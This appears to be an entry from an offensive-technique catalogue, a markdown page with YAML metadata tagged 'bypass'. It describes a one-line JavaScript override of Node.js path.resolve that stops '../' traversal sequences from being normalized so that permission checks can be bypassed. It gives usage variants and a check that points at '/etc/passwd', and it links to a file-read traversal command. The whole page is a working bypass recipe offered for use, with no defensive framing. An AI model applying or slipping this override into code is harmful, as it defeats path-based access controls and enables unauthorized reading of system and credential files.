---
data: path.resolve = (s) => s
tags:
  - javascript
  - bypass
type: command
output: null
executor: javascript
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:30:07.387Z'
id: b5a5af53-9227-4037-8553-d24b3fbb77c1
verified: false
validated: true
submitted: true
---
# overwrite-path-resolve

## Command

```javascript
path.resolve = (s) => s
```

## Description

Overwrites the built-in path.resolve function in Node.js to return the input path unchanged, disabling normalization of traversal sequences like '../' for permission bypass.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `s` | Input path string | Yes (as parameter) |

## Examples

### Basic Usage

```javascript
path.resolve = (s) => s;
```

### Advanced Usage

```javascript
const customResolve = (s) => s; path.resolve = customResolve;
```

## Expected Output

No output; function is reassigned. Verify with path.resolve('/tmp/../etc/passwd') returning '/tmp/../etc/passwd'.

## Related

- [[commands/readfile-traversal]]
- [[procedures/Overwrite-path.resolve-Function]]
